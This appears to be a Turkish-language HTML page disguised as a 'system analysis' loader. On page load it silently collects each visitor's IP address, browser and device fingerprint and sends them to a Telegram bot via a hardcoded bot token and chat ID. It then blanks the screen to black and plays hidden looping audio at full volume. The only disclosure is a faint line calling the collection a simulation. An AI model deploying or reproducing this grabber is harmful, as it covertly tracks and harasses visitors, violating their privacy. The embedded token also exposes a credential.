<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor Analizi</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            transition: background 1s ease;
        }
        body.black-screen {
            background: #000000 !important;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 500px;
            transition: opacity 1s ease;
            z-index: 2;
            position: relative;
        }
        body.black-screen .container {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .counter {
            font-size: 4em;
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .health-bar-container {
            width: 100%;
            height: 30px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            margin: 20px 0;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .health-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #4cd964, #5ac8fa);
            transition: width 0.1s linear;
            border-radius: 15px;
            box-shadow: 0 0 20px #4cd964;
        }
        .status {
            font-size: 1.2em;
            margin-top: 20px;
            opacity: 0.9;
        }
        .warning {
            font-size: 0.8em;
            margin-top: 30px;
            opacity: 0.6;
            border-top: 1px solid rgba(255,255,255,0.2);
            padding-top: 20px;
        }
        .audio-control {
            margin-top: 20px;
            font-size: 0.9em;
            opacity: 0.7;
        }
        #bg-audio {
            display: none; /* Gizli audio elementi */
        }
        .black-screen-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1;
            opacity: 0;
            visibility: hidden;
            transition: opacity 1s ease;
            pointer-events: none;
        }
        body.black-screen .black-screen-overlay {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
        }
    </style>
</head>
<body>
    <!-- Siyah ekran overlay -->
    <div class="black-screen-overlay"></div>
    
    <!-- Gizli ses oynatıcı -->
    <audio id="bg-audio" loop>
        <source src="video1.mp3" type="audio/mpeg">
        Tarayıcınız audio elementini desteklemiyor.
    </audio>

    <div class="container">
        <h1>🔍 Sistem Analizi Yükleniyor</h1>
        <div class="counter" id="counter">0</div>
        <div class="health-bar-container">
            <div class="health-bar" id="healthBar"></div>
        </div>
        <div class="status" id="status">Sistem başlatılıyor...</div>
        <div class="audio-control" id="audioStatus">🔇 Ses bekleniyor...</div>
        <div class="warning">
            ⚠️ Bu sayfa, ziyaretçi bilgilerini simülasyon amaçlı toplamaktadır.
        </div>
    </div>

    <script>
        let count = 0;
        const counterElement = document.getElementById('counter');
        const healthBarElement = document.getElementById('healthBar');
        const statusElement = document.getElementById('status');
        const audioStatusElement = document.getElementById('audioStatus');
        const audio = document.getElementById('bg-audio');
        const body = document.body;
        
        // KENDİ BİLGİLERİNİZİ BURAYA GİRİN
        const BOT_TOKEN = '8695583417:AAHZxz3RWI_prhnfk29ZbAK5ESjXSd8QOis'; // Telegram Bot Token'ınız
        const CHAT_ID = '@STCCriss'; // @STCCriss'in chat ID'si

        // Ses çalma yetkisi isteme ve başlatma
        function initializeAudio() {
            // Modern tarayıcılar kullanıcı etkileşimi olmadan ses çalmaz
            // Bu yüzden bir tıklama simülasyonu yapıyoruz
            const playPromise = audio.play();
            
            if (playPromise !== undefined) {
                playPromise.then(() => {
                    console.log('✅ Ses başarıyla başlatıldı');
                    audioStatusElement.innerHTML = '🔊 Ses aktif';
                }).catch(error => {
                    console.log('❌ Ses otomatik başlatılamadı:', error);
                    audioStatusElement.innerHTML = '⚠️ Sesi başlatmak için sayfaya tıklayın';
                    
                    // Sayfaya tıklandığında sesi başlat
                    document.body.addEventListener('click', function playAudioOnClick() {
                        audio.play();
                        audioStatusElement.innerHTML = '🔊 Ses aktif';
                        document.body.removeEventListener('click', playAudioOnClick);
                    }, { once: true });
                });
            }
        }

        // Detaylı bilgileri toplama fonksiyonu
        async function getDetailedInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'Doğrudan',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || 'Bilinmiyor',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Bilinmiyor',
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Bilinmiyor',
                doNotTrack: navigator.doNotTrack || 'Belirtilmemiş',
                localStorage: typeof(Storage) !== "undefined" ? 'Var' : 'Yok',
                sessionStorage: typeof(Storage) !== "undefined" ? 'Var' : 'Yok'
            };

            // IP adresini al
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
            } catch (error) {
                info.ip = 'IP alınamadı';
            }

            return info;
        }

        // Telegram'a mesaj gönderme fonksiyonu
        async function sendToTelegram(info) {
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                console.warn('⚠️ Lütfen BOT_TOKEN ve CHAT_ID bilgilerini girin!');
                console.log('Toplanan bilgiler:', info);
                return;
            }

            // Mesaj metnini oluştur
            const message = `
🔔 **Yeni Ziyaretçi Detaylı Bilgi** 🔔

🌐 **IP Adresi:** ${info.ip}
📱 **Cihaz Bilgileri:**
• Platform: ${info.platform}
• Tarayıcı: ${info.userAgent}
• Dil: ${info.language}
• Ekran: ${info.screenResolution}
• Renk Derinliği: ${info.colorDepth}
• Zaman Dilimi: ${info.timezone}
• İşlemci Çekirdeği: ${info.cores}
• RAM: ${info.memory}
• Bağlantı: ${info.connection !== 'Bilinmiyor' ? `${info.connection.type} (${info.connection.downlink} Mbps)` : info.connection}

🍪 **Çerezler:** ${info.cookiesEnabled ? 'Aktif' : 'Pasif'}
💾 **Local Storage:** ${info.localStorage}
💿 **Session Storage:** ${info.sessionStorage}
🚫 **Do Not Track:** ${info.doNotTrack}

🔗 **Giriş Sayfası:** ${info.url}
📎 **Yönlendiren:** ${info.referrer}
⏰ **Ziyaret Zamanı:** ${info.timestamp}
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log('✅ Bilgiler Telegram\'a gönderildi');
                } else {
                    console.error('❌ Telegram gönderim hatası:', await response.text());
                }
            } catch (error) {
                console.error('❌ Telegram bağlantı hatası:', error);
            }
        }

        // Siyah ekranı aktifleştir ve sesi yükselt
        function activateBlackScreen() {
            // Siyah ekranı göster
            body.classList.add('black-screen');
            
            // Sesi sonuna kadar aç (varsayılan volume 1)
            audio.volume = 1.0;
            
            // Ses seviyesini duruma yaz
            audioStatusElement.innerHTML = '🔊 Siyah ekran aktif - Ses devam ediyor';
            
            // Ekranda bir yazı gösterme (siyah ekran)
            console.log('⬛ Siyah ekran aktif');
        }

        // Sayaç fonksiyonu
        function startCounter() {
            const interval = setInterval(async () => {
                count++;
                counterElement.textContent = count;
                healthBarElement.style.width = count + '%';
                
                // Durum mesajını güncelle
                if (count < 30) {
                    statusElement.textContent = 'Sistem analiz ediliyor...';
                } else if (count < 60) {
                    statusElement.textContent = 'IP adresi tespit ediliyor...';
                } else if (count < 90) {
                    statusElement.textContent = 'Cihaz bilgileri toplanıyor...';
                } else if (count < 100) {
                    statusElement.textContent = 'Rapor hazırlanıyor...';
                }

                if (count === 100) {
                    clearInterval(interval);
                    statusElement.textContent = '✅ Analiz tamamlandı! Bilgiler gönderiliyor...';
                    
                    // Bilgileri topla ve gönder
                    const detailedInfo = await getDetailedInfo();
                    await sendToTelegram(detailedInfo);
                    
                    statusElement.textContent = '✅ Siyah ekran aktifleştiriliyor...';
                    
                    // 1 saniye bekle ve siyah ekranı aktifleştir
                    setTimeout(() => {
                        activateBlackScreen();
                    }, 1000);
                }
            }, 50); // 50ms'de bir artar
        }

        // Sayfa yüklendiğinde
        window.addEventListener('load', () => {
            // Ses dosyasını kontrol et
            audio.addEventListener('error', (e) => {
                console.error('❌ Ses dosyası yüklenemedi:', e);
                audioStatusElement.innerHTML = '❌ video1.mp3 bulunamadı!';
            });

            audio.addEventListener('canplay', () => {
                console.log('✅ Ses dosyası yüklenebilir');
            });

            // Ses başlatma girişimi
            setTimeout(() => {
                initializeAudio();
            }, 500); // 500ms sonra ses başlatma dene
            
            // Sayacı başlat
            setTimeout(startCounter, 1000); // 1 saniye gecikme ile başlat
        });

        // Sayfadan ayrılırken sesi durdur (opsiyonel)
        window.addEventListener('beforeunload', () => {
            audio.pause();
            audio.currentTime = 0;
        });
    </script>
</body>
  </html>
